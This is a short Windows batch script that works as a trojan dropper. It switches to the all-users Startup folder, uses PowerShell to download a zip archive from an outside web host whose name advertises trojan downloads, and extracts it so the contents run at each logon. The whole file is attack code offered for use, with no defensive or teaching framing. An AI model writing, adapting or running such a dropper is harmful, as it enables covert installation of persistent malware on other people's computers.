rem echo off
@echo off

rem cd to startup folder
cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup

rem download the file
powershell -Command "Invoke-WebRequest https://downloads-for-trojan-by-varun-banka.netlify.app/my_zip_file.zip -OutFile my_zip_file.zip"

rem unzip the downloaded file
powershell -command "Expand-Archive -Force '%~dp0my_zip_file.zip' '%~dp0'"

rem code by varun banka
